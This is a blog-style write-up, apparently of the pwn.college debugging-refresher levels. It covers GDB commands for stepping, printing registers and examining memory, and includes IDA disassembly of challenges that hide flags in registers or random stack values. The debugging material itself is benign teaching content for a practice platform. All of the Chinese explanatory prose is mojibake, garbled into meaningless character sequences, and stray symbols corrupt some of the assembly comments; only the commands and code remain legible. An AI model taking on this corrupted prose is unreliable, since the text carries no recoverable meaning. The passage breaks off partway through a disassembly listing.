    <content type="html"><![CDATA[<p>GDB éå¸¸å¼ºå¤§ï¼</p><span id="more"></span><p><img src="/image/pwn-college.png"></p><p><a href="https://pwn.college/fundamentals/debugging-refresher">https://pwn.college/fundamentals/debugging-refresher</a></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ul><li>ç†Ÿæ‚‰ä¸€äº›gdbå‘½ä»¤ <ul><li>ä¸€äº›å¸¸ç”¨çš„æŒ‡ä»¤<ul><li>layout asm</li><li>layout regs</li><li>display /10i <ul><li>undisplay num å–æ¶ˆ</li></ul></li><li>Â <code>start</code>Â å¯åŠ¨ç¨‹åºï¼Œæ–­ç‚¹è®¾ç½®åœ¨Â <code>main</code>Â </li><li>Â <code>run</code>Â å¯åŠ¨ç¨‹åºï¼Œä¸è®¾ç½®æ–­ç‚¹</li><li>p/x $rax ä»¥åå…­è¿›åˆ¶æ‰“å°å‡ºraxçš„å€¼</li><li>x æŸ¥çœ‹å†…å­˜çš„å€¼<ul><li><code>x/20g  $rbp-0x18</code></li></ul></li><li>set ä¿®æ”¹å†…å­˜çš„å€¼<ul><li><code>set *(int*)($rbp-0x1c) = 100</code></li></ul></li><li><code>call (void)win()</code>Â  è°ƒç”¨å‡½æ•°</li></ul></li></ul></li><li>ç†Ÿæ‚‰å¦‚ä½•å†™gdbè„šæœ¬ä¸ç¨‹åºè¿›è¡Œäº¤äº’<ul><li>gdbå¯åŠ¨æ—¶å€™çš„è„šæœ¬ï¼š.gdbinit</li><li>ä¸ç¨‹åºäº¤äº’çš„è„šæœ¬ï¼šxxx.gdbã€‚å°†å‘½ä»¤å†™å…¥æŸä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚<code>x.gdb</code>ï¼Œç„¶åä½¿ç”¨æ ‡å¿—<code>-x &lt;PATH_TO_SCRIPT&gt;</code>å¯åŠ¨gdb</li><li>è°ƒæ•´æ±‡ç¼–é£æ ¼ï¼š<code>set disassembly-flavor intel</code></li></ul></li></ul><h1 id="Lectures-and-Reading"><a href="#Lectures-and-Reading" class="headerlink" title="Lectures and Reading"></a>Lectures and Reading</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">GDBæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„åŠ¨æ€åˆ†æå·¥å…·ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥äº†è§£ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­çš„çŠ¶æ€ã€‚åœ¨æœ¬æ¨¡å—ä¸­ï¼Œæ‚¨å°†ç†Ÿæ‚‰ä¸€äº›GDBçš„åŠŸèƒ½ã€‚<br><br>æ‚¨æ­£åœ¨è¿è¡ŒGDBï¼ç¨‹åºå½“å‰å¤„äºæš‚åœçŠ¶æ€ã€‚è¿™æ˜¯å› ä¸ºå®ƒåœ¨è¿™é‡Œè®¾ç½®äº†æ–­ç‚¹ã€‚<br><br>æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤Â `start`Â å¯åŠ¨ç¨‹åºï¼Œæ–­ç‚¹è®¾ç½®åœ¨Â `main`Â ä¸Šã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤Â `starti`Â å¯åŠ¨ç¨‹åºï¼Œæ–­ç‚¹è®¾ç½®åœ¨Â `_start`Â ä¸Šã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤Â `run`Â å¯åŠ¨ç¨‹åºï¼Œä¸è®¾ç½®æ–­ç‚¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤Â `attach &lt;PID&gt;`Â è¿æ¥åˆ°å…¶ä»–å·²ç»è¿è¡Œçš„ç¨‹åºã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤Â `core &lt;PATH&gt;`Â åˆ†æå·²ç»è¿è¡Œçš„ç¨‹åºçš„æ ¸å¿ƒè½¬å‚¨ã€‚<br><br>åœ¨å¯åŠ¨æˆ–è¿è¡Œç¨‹åºæ—¶ï¼Œæ‚¨å¯ä»¥å‡ ä¹ä»¥ä¸åœ¨shellä¸­ç›¸åŒçš„æ–¹å¼æŒ‡å®šå‚æ•°ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Â `start &lt;ARGV1&gt; &lt;ARGV2&gt; &lt;ARGVN&gt; &lt; &lt;STDIN_PATH&gt;`ã€‚<br><br>ä½¿ç”¨å‘½ä»¤Â `continue`Â æˆ–Â `c`Â ç»§ç»­æ‰§è¡Œç¨‹åºã€‚<br></code></pre></td></tr></table></figure><p>ç›´æ¥runï¼Œç¨‹åºæ‰§è¡Œå®Œæ¯•æ—¶åå‡ºflag</p><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>æ‰“å°å‡ºå¯„å­˜å™¨çš„å€¼</p><ul><li>info registers</li><li>p/x $rax <ul><li>ä»¥åå…­è¿›åˆ¶æ‰“å°å‡ºraxçš„å€¼</li></ul></li></ul><p>flagå­˜åœ¨r12å¯„å­˜å™¨ä¸­</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>GDBæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„åŠ¨æ€åˆ†æå·¥å…·ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥äº†è§£ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­çš„çŠ¶æ€ã€‚åœ¨æœ¬æ¨¡å—ä¸­ï¼Œæ‚¨å°†ç†Ÿæ‚‰ä¸€äº›GDBçš„åŠŸèƒ½ã€‚<br><br>æ‚¨å¯ä»¥ä½¿ç”¨ `x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt;` å‘½ä»¤æ¥æ£€æŸ¥å†…å­˜çš„å†…å®¹ã€‚åœ¨è¿™ä¸ªæ ¼å¼ä¸­ï¼Œ`&lt;u&gt;` æ˜¯è¦æ˜¾ç¤ºçš„å•å…ƒå¤§å°ï¼Œ`&lt;f&gt;` æ˜¯è¦æ˜¾ç¤ºçš„æ ¼å¼ï¼Œ`&lt;n&gt;` æ˜¯è¦æ˜¾ç¤ºçš„å…ƒç´ æ•°é‡ã€‚æœ‰æ•ˆçš„å•å…ƒå¤§å°æœ‰ `b`ï¼ˆ<span class="hljs-number">1</span>å­—èŠ‚ï¼‰ã€`h`ï¼ˆ<span class="hljs-number">2</span>å­—èŠ‚ï¼‰ã€`w`ï¼ˆ<span class="hljs-number">4</span>å­—èŠ‚ï¼‰å’Œ `g`ï¼ˆ<span class="hljs-number">8</span>å­—èŠ‚ï¼‰ã€‚æœ‰æ•ˆçš„æ ¼å¼æœ‰ `d`ï¼ˆåè¿›åˆ¶ï¼‰ã€`x`ï¼ˆåå…­è¿›åˆ¶ï¼‰ã€`s`ï¼ˆå­—ç¬¦ä¸²ï¼‰å’Œ `i`ï¼ˆæŒ‡ä»¤ï¼‰ã€‚åœ°å€å¯ä»¥ä½¿ç”¨å¯„å­˜å™¨åã€ç¬¦å·åæˆ–ç»å¯¹åœ°å€æ¥æŒ‡å®šã€‚æ­¤å¤–ï¼Œåœ¨æŒ‡å®šåœ°å€æ—¶ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ•°å­¦è¡¨è¾¾å¼ã€‚<br><br>ä¾‹å¦‚ï¼Œ`x/<span class="hljs-number">8</span>i $rip` å°†æ‰“å°å½“å‰æŒ‡ä»¤æŒ‡é’ˆåé¢çš„<span class="hljs-number">8</span>æ¡æŒ‡ä»¤ã€‚`x/<span class="hljs-number">16</span>i main` å°†æ‰“å° main å‡½æ•°çš„å‰<span class="hljs-number">16</span>æ¡æŒ‡ä»¤ã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ `disassemble main` æˆ– `disas main`ï¼ˆç®€å†™ï¼‰æ¥æ‰“å° main å‡½æ•°çš„æ‰€æœ‰æŒ‡ä»¤ã€‚å¦å¤–ï¼Œ`x/<span class="hljs-number">16</span>gx $rsp` å°†æ‰“å°å †æ ˆä¸Šçš„å‰<span class="hljs-number">16</span>ä¸ªå€¼ã€‚`x/gx $rbp-<span class="hljs-number">0</span>x32` å°†æ‰“å°å­˜å‚¨åœ¨å †æ ˆä¸Šçš„è¯¥ä½ç½®çš„å±€éƒ¨å˜é‡ã€‚<br><br>æ‚¨å¯èƒ½å¸Œæœ›ä½¿ç”¨æ­£ç¡®çš„æ±‡ç¼–è¯­æ³•æŸ¥çœ‹æŒ‡ä»¤ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤ `set disassembly-flavor intel` æ¥å®ç°ã€‚<br><br>ä¸ºäº†è§£å†³è¿™ä¸ªå…³å¡ï¼Œæ‚¨å¿…é¡»æ‰¾å‡ºå †æ ˆä¸Šçš„éšæœºå€¼ï¼ˆä» `/dev/urandom` è¯»å–çš„å€¼ï¼‰ã€‚æ€è€ƒä¸€ä¸‹ read ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ˜¯ä»€ä¹ˆã€‚<br><br>ç¨‹åºæ¥æ”¶åˆ°ä¿¡å· SIGTRAPï¼Œè·Ÿè¸ª/æ–­ç‚¹é™·é˜±ã€‚<br></code></pre></td></tr></table></figure><ul><li>layout asm</li><li>layout regs</li></ul><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>. `open`å‡½æ•°ï¼š<br>    <br>    `#include &lt;fcntl.h&gt; int open(const char *pathname, int flags, mode_t mode)<span class="hljs-comment">;`</span><br>    <br>    `open`å‡½æ•°ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶è¿”å›æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ã€‚å®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼š<br>    <br>    - `pathname`ï¼šè¦æ‰“å¼€çš„æ–‡ä»¶çš„è·¯å¾„åã€‚<br>    - `flags`ï¼šæ‰“å¼€æ–‡ä»¶çš„æ ‡å¿—ï¼Œä¾‹å¦‚`O_RDONLY`ï¼ˆåªè¯»ï¼‰ã€`O_WRONLY`ï¼ˆåªå†™ï¼‰ã€`O_RDWR`ï¼ˆè¯»å†™ï¼‰ç­‰ã€‚<br>    - `mode`ï¼šæŒ‡å®šæ–°åˆ›å»ºæ–‡ä»¶çš„æƒé™ï¼Œé€šå¸¸ä½¿ç”¨å…«è¿›åˆ¶è¡¨ç¤ºï¼Œä¾‹å¦‚`0644`ã€‚<br>    <br>    `open`å‡½æ•°è¿”å›ä¸€ä¸ªéè´Ÿæ•´æ•°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœå‡ºç°é”™è¯¯ï¼Œåˆ™è¿”å›-<span class="hljs-number">1</span>ã€‚<br>    <br><span class="hljs-number">2</span>. `read`å‡½æ•°ï¼š<br>    <br>    `#include &lt;unistd.h&gt; ssize_t read(int fd, void *buf, size_t count)<span class="hljs-comment">;`</span><br>    <br>    `read`å‡½æ•°ç”¨äºä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚å®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼š<br>    <br>    - `fd`ï¼šè¦è¯»å–çš„æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ã€‚<br>    - `buf`ï¼šç”¨äºå­˜å‚¨è¯»å–æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚<br>    - `count`ï¼šè¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚<br>    <br>    `read`å‡½æ•°è¿”å›å®é™…è¯»å–çš„å­—èŠ‚æ•°ï¼Œå¦‚æœè¿”å›å€¼ä¸º<span class="hljs-number">0</span>è¡¨ç¤ºå·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œå¦‚æœè¿”å›-<span class="hljs-number">1</span>è¡¨ç¤ºå‡ºç°é”™è¯¯ã€‚<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å¯¹åº”çš„é€»è¾‘</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0000000000001C2C loc_1C2C:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001CDDâ†“j</span><br><span class="hljs-symbol">.text:</span>0000000000001C2C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C31                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aDevUrandom <span class="hljs-comment">; &quot;/dev/urandom&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001C38                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C3D                 <span class="hljs-keyword">call</span>    _open<br><span class="hljs-symbol">.text:</span>0000000000001C42                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000001C44                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001C48                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0000000000001C4D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001C50                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-symbol">.text:</span>0000000000001C52                 <span class="hljs-keyword">call</span>    _read<br><span class="hljs-symbol">.text:</span>0000000000001C57                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aTheRandomValue <span class="hljs-comment">; &quot;The random value has been set!\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001C5E                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C63                 <span class="hljs-keyword">int</span>     <span class="hljs-number">3</span>               <span class="hljs-comment">; Trap to Debugger</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ‰“å¼€randomæ–‡ä»¶ï¼Œç„¶åreadåˆ°ç¼“å†²åŒºä¸­ï¼Œè·å–ç¼“å†²åŒºçš„å†…å®¹ï¼Œä½œä¸ºä¸‹ä¸€ä¸ªscanfå‡½æ•°çš„è¾“å…¥ï¼Œå³å¯è·å¾—flag</p><p>x/20g  $rbp-0x18å³å¯è¯»å–</p><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">åŠ¨æ€åˆ†æçš„ä¸€ä¸ªå…³é”®éƒ¨åˆ†æ˜¯å°†ç¨‹åºè¿è¡Œåˆ°æ‚¨æ„Ÿå…´è¶£çš„çŠ¶æ€ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œè¿™äº›æŒ‘æˆ˜å·²ç»ä¸ºæ‚¨è‡ªåŠ¨è®¾ç½®äº†æ–­ç‚¹ï¼Œä»¥ä¾¿åœ¨æ‚¨å¯èƒ½æ„Ÿå…´è¶£çš„çŠ¶æ€ä¸‹æš‚åœæ‰§è¡Œã€‚è‡ªå·±èƒ½å¤Ÿåšåˆ°è¿™ä¸€ç‚¹éå¸¸é‡è¦ã€‚<br><br>åœ¨ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæœ‰å¤šç§æ–¹å¼å¯ä»¥å‘å‰ç§»åŠ¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`stepi &lt;n&gt;`å‘½ä»¤æˆ–`si &lt;n&gt;`å‘½ä»¤ï¼ˆç®€å†™ï¼‰å‘å‰å•æ­¥æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`nexti &lt;n&gt;`å‘½ä»¤æˆ–`ni &lt;n&gt;`å‘½ä»¤ï¼ˆç®€å†™ï¼‰å‘å‰å•æ­¥æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ï¼ŒåŒæ—¶è·³è¿‡ä»»ä½•å‡½æ•°è°ƒç”¨ã€‚`&lt;n&gt;`å‚æ•°æ˜¯å¯é€‰çš„ï¼Œä½†å¯ä»¥è®©æ‚¨ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªæ­¥éª¤ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`finish`å‘½ä»¤æ¥å®Œæˆå½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`break *&lt;address&gt;`å‚æ•°åŒ–å‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€è®¾ç½®æ–­ç‚¹ã€‚æ‚¨å·²ç»ä½¿ç”¨äº†`continue`å‘½ä»¤ï¼Œå®ƒå°†ç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°ç¨‹åºé‡åˆ°æ–­ç‚¹ã€‚<br><br>åœ¨é€æ­¥æ‰§è¡Œç¨‹åºæ—¶ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°å§‹ç»ˆæ˜¾ç¤ºä¸€äº›å€¼å¯¹æ‚¨å¾ˆæœ‰ç”¨ã€‚æœ‰å¤šç§æ–¹æ³•å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨`display/&lt;n&gt;&lt;u&gt;&lt;f&gt;`å‚æ•°åŒ–å‘½ä»¤ï¼Œå…¶æ ¼å¼ä¸`x/&lt;n&gt;&lt;u&gt;&lt;f&gt;`å‚æ•°åŒ–å‘½ä»¤å®Œå…¨ç›¸åŒã€‚ä¾‹å¦‚ï¼Œ`display/<span class="hljs-number">8</span>i $rip`å°†å§‹ç»ˆæ˜¾ç¤ºæ¥ä¸‹æ¥çš„<span class="hljs-number">8</span>æ¡æŒ‡ä»¤ã€‚å¦ä¸€æ–¹é¢ï¼Œ`display/<span class="hljs-number">4</span>gx $rsp`å°†å§‹ç»ˆæ˜¾ç¤ºå †æ ˆä¸Šçš„å‰<span class="hljs-number">4</span>ä¸ªå€¼ã€‚å¦ä¸€ä¸ªé€‰é¡¹æ˜¯ä½¿ç”¨`layout regs`å‘½ä»¤ã€‚è¿™å°†å°†GDBåˆ‡æ¢åˆ°TUIæ¨¡å¼ï¼Œå¹¶æ˜¾ç¤ºæ‰€æœ‰å¯„å­˜å™¨çš„å†…å®¹ï¼Œä»¥åŠé™„è¿‘çš„æŒ‡ä»¤ã€‚<br><br>ä¸ºäº†è§£å†³è¿™ä¸ªçº§åˆ«çš„é—®é¢˜ï¼Œæ‚¨å¿…é¡»æ‰¾å‡ºä¸€ç³»åˆ—å°†æ”¾ç½®åœ¨å †æ ˆä¸Šçš„éšæœºå€¼ã€‚å¼ºçƒˆå»ºè®®æ‚¨å°è¯•ä½¿ç”¨`stepi`ã€`nexti`ã€`break`ã€`continue`å’Œ`finish`çš„ç»„åˆï¼Œä»¥ç¡®ä¿æ‚¨å¯¹è¿™äº›å‘½ä»¤æœ‰è‰¯å¥½çš„å†…éƒ¨ç†è§£ã€‚è¿™äº›å‘½ä»¤åœ¨å¯¼èˆªç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­æ˜¯ç»å¯¹å…³é”®çš„ã€‚<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹æ±‡ç¼–æºç </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0000000000001AA6 <span class="hljs-comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6                 <span class="hljs-meta">public</span> main<br><span class="hljs-symbol">.text:</span>0000000000001AA6 main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: _start+21â†‘o</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6<br><span class="hljs-symbol">.text:</span>0000000000001AA6 var_38          = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">38h</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6 var_30          = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">30h</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6 var_24          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">24h</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6 var_8           = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6<br><span class="hljs-symbol">.text:</span>0000000000001AA6 <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6                 endbr64<br><span class="hljs-symbol">.text:</span>0000000000001<span class="hljs-keyword">AAA</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>0000000000001AAB                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span>0000000000001AAE                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span>0000000000001AB2                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_24], <span class="hljs-built_in">edi</span><br><span class="hljs-symbol">.text:</span>0000000000001AB5                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_30], <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>0000000000001AB9                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_38], <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span>0000000000001ABD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">fs</span>:<span class="hljs-number">28h</span><br><span class="hljs-symbol">.text:</span>0000000000001AC6                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001ACA                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000001ACC                 <span class="hljs-keyword">cmp</span>     [<span class="hljs-built_in">rbp</span>+var_24], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001AD0                 <span class="hljs-keyword">jg</span>      short loc_1AF1<br><span class="hljs-symbol">.text:</span>0000000000001AD2                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, __PRETTY_FUNCTION___5345 <span class="hljs-comment">; &quot;main&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001AD9                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">51h</span> <span class="hljs-comment">; &#x27;Q&#x27;  ; line</span><br><span class="hljs-symbol">.text:</span>0000000000001ADE                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, file       <span class="hljs-comment">; &quot;&lt;stdin&gt;&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001AE5                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aArgc0     <span class="hljs-comment">; &quot;argc &gt; 0&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001AEC                 <span class="hljs-keyword">call</span>    ___assert_fail<br><span class="hljs-symbol">.text:</span>0000000000001AF1 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>0000000000001AF1<br><span class="hljs-symbol">.text:</span>0000000000001AF1 loc_1AF1:                               <span class="hljs-comment">; CODE XREF: main+2Aâ†‘j</span><br><span class="hljs-symbol">.text:</span>0000000000001AF1                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, asc_21C5   <span class="hljs-comment">; &quot;###&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001AF8                 <span class="hljs-keyword">call</span>   